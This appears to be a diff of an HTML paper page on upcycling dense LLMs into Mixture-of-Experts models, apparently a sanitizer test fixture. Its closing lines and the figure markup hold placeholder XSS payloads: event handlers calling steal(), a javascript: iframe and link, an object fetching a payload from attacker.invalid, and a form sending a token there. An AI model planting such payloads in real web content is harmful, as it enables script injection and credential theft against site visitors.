@@ -3,6 +3,8 @@
 <head>
 <meta charset="utf-8">
 <title>Upcycling Large Language Models into Mixture of Experts</title>
+<link rel="stylesheet" href="publisher.css">
+<style>.ltx_document { color: #111; width: 1400px; }</style>
 </head>
 <body>
 <div class="ds-announcement">arXiv is now an independent nonprofit! <a href="#">Learn more</a></div>
@@ -20,35 +22,70 @@
 </div>
 <section id="S1" class="ltx_section">
 <h2 class="ltx_title ltx_title_section"><span class="ltx_tag ltx_tag_section">1 </span>Introduction</h2>
-<div class="ltx_para"><p class="ltx_p">Sparse Mixture of Experts (MoE) models are becoming increasingly popular since they can help achieve better accuracy without a commensurate increase in model training compute. Upcycling pre-trained dense language models into sparse mixture-of-experts models has emerged as an efficient approach to increase model capacity without the need for training from scratch. By leveraging the knowledge captured in existing dense checkpoints, upcycling enables the creation of large-scale mixture-of-experts models while reducing the computational cost and time required for training.</p></div>
+<div class="ltx_para"><p class="ltx_p">Sparse Mixture of Experts (MoE) models are becoming increasingly popular since they can help achieve <strong>better accuracy</strong> without a commensurate increase in model training compute. Upcycling pre-trained dense language models into sparse mixture-of-experts models has emerged as an efficient approach to increase model capacity without the need for training from scratch. By leveraging the knowledge captured in existing dense checkpoints, upcycling enables the creation of large-scale mixture-of-experts models while reducing the computational cost and time required for training.</p></div>
 <div class="ltx_para"><p class="ltx_p">Most previous work on upcycling either does not provide details into how their models were upcycled, or provides experiments only at a small scale. To improve general knowledge on upcycling methods, we therefore publish this study of upcycling methods and best practices for billion-parameter scale language models.</p></div>
-<div class="ltx_para"><p class="ltx_p">In this work, we conduct an extensive study of upcycling techniques and hyperparameters. Our contributions include training recipes to consistently upcycle billion-parameter scale LLMs, a comprehensive study of learning rate and batch size, and a novel virtual group initialization scheme for fine-grained MoE architectures.</p></div>
+<div class="ltx_para"><p class="ltx_p">In this work, we conduct an <em>extensive study</em> of upcycling techniques and hyperparameters. Our contributions include training recipes to consistently upcycle billion-parameter scale LLMs, a comprehensive study of learning rate and batch size, and a novel virtual group initialization scheme for fine-grained MoE architectures <small>at production scale</small>. The router score is x<sub>i</sub><sup>2</sup>.</p></div>
+<section id="S1.SS1" class="ltx_subsection">
+<h3 class="ltx_title ltx_title_subsection"><span class="ltx_tag ltx_tag_subsection">1.1 </span>Contributions</h3>
+<div class="ltx_para"><p class="ltx_p">The evaluation follows three deterministic stages:</p></div>
+<ul class="ltx_itemize"><li>Initialize experts.<ul><li>Copy dense weights.</li><li>Scale every virtual group.</li></ul></li><li>Train the router.</li></ul>
+<dl class="ltx_description"><dt>Granularity</dt><dd>The ratio of experts to dense blocks.</dd><dt>Routing</dt><dd>The token-to-expert assignment rule.</dd></dl>
+<section id="S1.SS1.SSS1" class="ltx_subsubsection">
+<h4 class="ltx_title ltx_title_subsubsection"><span class="ltx_tag ltx_tag_subsubsection">1.1.1 </span>Notation</h4>
+<div class="ltx_para"><p class="ltx_p">We use an ordered tuple for every training recipe and preserve its source reading order.</p></div>
+</section>
+</section>
 </section>
 <section id="S2" class="ltx_section">
 <h2 class="ltx_title ltx_title_section"><span class="ltx_tag ltx_tag_section">2 </span>Methodology</h2>
 <div class="ltx_para"><p class="ltx_p">In this work, we only investigate MoEs on the MLP layer of the transformer. These layers comprise the majority of compute and treat each token individually, avoiding issues with kv-cache consistency. A routing layer routes the tokens to a subset of multiple possible MLP layers.</p></div>
-<figure class="ltx_figure" id="S2.F1">
-<img src="x1.png" class="ltx_graphics" alt="MoE diagram">
+<figure class="ltx_figure publisher-rounded" id="S2.F1" style="width: 1200px" onclick="steal()">
+<img src="./moe-routing.svg" class="ltx_graphics publisher-shadow" alt="MoE routing diagram" onerror="steal()">
 <figcaption class="ltx_caption">Figure 1: Converting pre-trained dense checkpoint into Mixture of Experts.</figcaption>
 </figure>
 <div class="ltx_para"><p class="ltx_p">The standard MoE router formulation performs a softmax on router logits followed by a topK. The activations from the experts are then multiplied by the softmax probability.</p></div>
-<table class="ltx_tabular">
-<thead><tr><th>Model</th><th>MMLU</th></tr></thead>
-<tbody><tr><td>Continuous dense</td><td>65.3%</td></tr><tr><td>Upcycled MoE</td><td>67.6%</td></tr></tbody>
+<figure class="ltx_table" id="S2.T1">
+<figcaption class="ltx_caption">Table 1: Wide benchmark comparison.</figcaption>
+<table class="ltx_tabular publisher-table" style="min-width: 1200px">
+<thead><tr><th scope="col">Model</th><th scope="col">MMLU</th><th scope="col">Tokens</th><th scope="col">Experts</th><th scope="col">Routing</th></tr></thead>
+<tbody><tr><th scope="row">Continuous dense</th><td>65.3%</td><td>1T</td><td>1</td><td>Dense</td></tr><tr><th scope="row">Upcycled MoE</th><td>67.6%</td><td>1T</td><td>32</td><td>Softmax then topK</td></tr></tbody>
 </table>
+</figure>
 <div class="ltx_para"><p class="ltx_p">We compare upcycling with both topK-then-softmax and softmax-then-topK in topK greater than one regime. Granularity introduces a new degree of freedom as every expert can be reduced in size while keeping overall FLOPs count the same.</p></div>
-<div class="ltx_para"><p class="ltx_p">Inline math example: <math alttext="a+b^2"><mrow><mi>a</mi><mo>+</mo><msup><mi>b</mi><mn>2</mn></msup></mrow></math> and display equation below.</p></div>
+<div class="ltx_para"><p class="ltx_p">Inline math example: <math alttext="a plus b squared"><mrow><mi>a</mi><mo>+</mo><msup><mi>b</mi><mn>2</mn></msup></mrow></math> and display equation below. Prior work <cite class="ltx_cite"><a href="#bib.b1">[1]</a></cite> motivates the design.<sup id="note-mark.1" class="ltx_note_mark"><a href="#note.1">1</a></sup></p></div>
 <div class="ltx_equationgroup">
-<div class="ltx_equation"><math display="block"><mrow><mi>E</mi><mo>(</mo><mi>x</mi><mo>)</mo><mo>=</mo><mi>FFN</mi><mo>(</mo><mi>x</mi><mo>)</mo></mrow></math></div>
+<div class="ltx_equation"><math display="block" alttext="E of x equals the weighted sum of many fine grained expert functions"><mrow><mi>E</mi><mo>(</mo><mi>x</mi><mo>)</mo><mo>=</mo><munderover><mo>∑</mo><mrow><mi>i</mi><mo>=</mo><mn>1</mn></mrow><mrow><mi>N</mi><mo>=</mo><mn>32</mn></mrow></munderover><msub><mi>p</mi><mi>i</mi></msub><mo>(</mo><mi>x</mi><mo>)</mo><msub><mi>FFN</mi><mi>i</mi></msub><mo>(</mo><mi>x</mi><mo>)</mo><mo>+</mo><mi>regularization</mi><mo>(</mo><mi>virtual_group_assignment</mi><mo>)</mo></mrow></math><span class="ltx_tag ltx_tag_equation" id="S2.E1">(1)</span></div>
 </div>
+<div class="ltx_theorem ltx_theorem_theorem" id="Thm1">
+<h6 class="ltx_title ltx_runin">Theorem 1 (Stable upcycling).</h6>
+<div class="ltx_para"><p class="ltx_p">For a fixed token budget, virtual groups preserve the dense checkpoint initialization.</p></div>
+</div>
+<div class="ltx_theorem ltx_theorem_proof">
+<h6 class="ltx_title ltx_runin">Proof.</h6>
+<div class="ltx_para"><p class="ltx_p">Copy each expert weight, apply the shared scale, and observe that the routed sum equals the original dense output.</p></div>
+</div>
+</section>
+<section class="ltx_notes" aria-labelledby="attacker-label">
+<h2 class="ltx_title">Notes</h2>
+<ol><li id="note.1" class="ltx_note_outer"><p>Fine-grained means more, smaller experts. <a class="ltx_note_mark" href="#note-mark.1" aria-label="Return to note reference">↩</a></p></li></ol>
 </section>
 <section id="Sx1" class="ltx_bibliography">
 <h2 class="ltx_title ltx_title_bibliography">References</h2>
 <ul class="ltx_biblist">
-<li class="ltx_bibitem"><span class="ltx_tag">[1]</span> Shazeer et al., Outrageously Large Neural Networks.</li>
-<li class="ltx_bibitem"><span class="ltx_tag">[2]</span> Lepikhin et al., GShard.</li>
+<li id="bib.b1" class="ltx_bibitem"><span class="ltx_tag">[1]</span> Shazeer et al., Outrageously Large Neural Networks.</li>
+<li id="bib.b2" class="ltx_bibitem"><span class="ltx_tag">[2]</span> Lepikhin et al., GShard.</li>
 </ul>
 </section>
+<div class="ltx_unknown publisher-layout" id="attacker-label"><p>Safe descendant inside an unknown presentation wrapper.</p></div>
+<script>window.evil = true</script>
+<style>.inc-article { display: none }</style>
+<iframe src="javascript:alert(1)"></iframe>
+<object data="https://attacker.invalid/payload"></object>
+<embed src="data:text/html,evil">
+<form action="https://attacker.invalid"><input name="token"></form>
+<svg onload="steal()"><script>steal()</script><text>unsafe svg</text></svg>
+<a class="inc-theorem attacker-class" id="arbitrary-id" href="javascript:steal()" style="color:red" aria-labelledby="arbitrary-id">Visible unsafe link text</a>
+<img src="data:text/html,evil" alt="unsafe data image">
 </article>
 </body>
 </html>
